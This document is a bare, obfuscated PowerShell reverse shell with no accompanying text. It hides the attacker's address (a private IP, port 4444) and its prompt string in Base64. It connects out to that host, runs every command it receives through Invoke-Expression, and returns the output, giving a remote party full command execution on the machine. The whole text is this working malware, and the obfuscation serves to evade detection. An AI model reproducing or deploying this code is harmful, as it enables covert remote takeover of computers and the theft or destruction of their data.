${_/\/\/\/\/===\/\_} = New-Object System.Net.Sockets.TCPClient($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQA3ADIALgAyADUALgA1ADgALgA2AA=='))),4444);
${/=\/=\___/==\/==\} = ${_/\/\/\/\/===\/\_}.GetStream();
[byte[]]${__/\/\/\_/===\_/\} = 0..65535|%{0};
while((${_/\/\/==\_/==\/==} = ${/=\/=\___/==\/==\}.Read(${__/\/\/\_/===\_/\}, 0, ${__/\/\/\_/===\_/\}.Length)) -ne 0)
{
${_/\_/\/\/\/\/====} = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(${__/\/\/\_/===\_/\},0, ${_/\/\/==\_/==\/==});
${_/===\/\/===\_/\_} = (iex ${_/\_/\/\/\/\/====} 2>&1 | Out-String );
${__/\_/==\/=\/\/\/} = ${_/===\/\/===\_/\_} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTACAA'))) + (pwd).Path + '> ';
${/===\/=\__/===\_/} = ([text.encoding]::ASCII).GetBytes(${__/\_/==\/=\/\/\/});
${/=\/=\___/==\/==\}.Write(${/===\/=\__/===\_/},0,${/===\/=\__/===\_/}.Length);
${/=\/=\___/==\/==\}.Flush();
}
${_/\/\/\/\/===\/\_}.Close();
